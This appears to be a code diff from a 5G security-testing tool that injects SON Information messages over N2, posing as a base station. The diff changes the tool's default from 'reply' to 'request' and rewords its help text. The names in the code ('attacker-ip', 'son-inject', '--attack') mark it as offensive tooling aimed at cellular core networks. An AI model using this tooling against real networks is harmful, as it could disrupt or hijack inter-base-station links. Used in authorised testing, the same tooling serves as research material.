@@ -432,7 +432,7 @@ def cmd_ul_ran_config_transfer(gnb, a):
     xn_ip = getattr(a, "xn_ip", None)
     if xn_ip in (None, "auto"):
         xn_ip = resolve_attacker_ip(gnb.cfg, a)
-    son = getattr(a, "son", "reply") or "reply"
+    son = getattr(a, "son", "request") or "request"
     gnb.send(B.uplink_ran_configuration_transfer(
         gnb.cfg, target_gnb_id=a.target_gnb_id, source_gnb_id=a.source_gnb_id,
         target_gnb_id_len=tgt_len, source_gnb_id_len=src_len,
@@ -443,7 +443,7 @@ def cmd_ul_ran_config_transfer(gnb, a):
           f"source gNB-id={int(src):#x}/{src_bits}bit "
           f"xn-ip={xn_ip} "
           f"target gNB-id={a.target_gnb_id:#x}/{tgt_len}bit "
-          f"(target may Xn-Setup toward source on Reply)")
+          f"(ask target for its Xn TNL; listen for SON Reply on N2)")
     _save(a.evidence, {"attack": "son-inject",
                        "son": son,
                        "source_gnb_id": src,
@@ -983,9 +983,9 @@ def main():
                         "initiate Xn Setup toward this tester)")
     s.add_argument("--attacker-ip", default="auto",
                    help="alias of --xn-ip (same bind_ip resolution)")
-    s.add_argument("--son", choices=["reply", "request"], default="reply",
-                   help="SON Information: reply (default, TS 38.413 8.8.2.2 "
-                        "Xn establishment) or request (ask target for its TNL)")
+    s.add_argument("--son", choices=["request", "reply"], default="request",
+                   help="SON Information: request (default, ask target for its "
+                        "Xn TNL) or reply (answer a former request)")
 
     s = sub.add_parser("sweep")
     s.add_argument("--attack", required=True,
